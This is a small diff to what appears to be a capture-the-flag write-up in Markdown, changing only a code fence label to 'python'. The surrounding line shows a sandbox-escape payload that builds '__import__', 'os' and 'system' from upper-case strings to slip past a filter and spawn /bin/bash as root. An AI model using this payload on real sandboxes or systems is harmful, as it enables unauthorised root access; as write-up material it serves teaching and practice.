@@ -249,7 +249,7 @@ We can spawn a bash shell `/bin/bash` as root:
 
 ![](attachments/20240329174343.png)
 
-```
+```python
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash') 
 ```
 
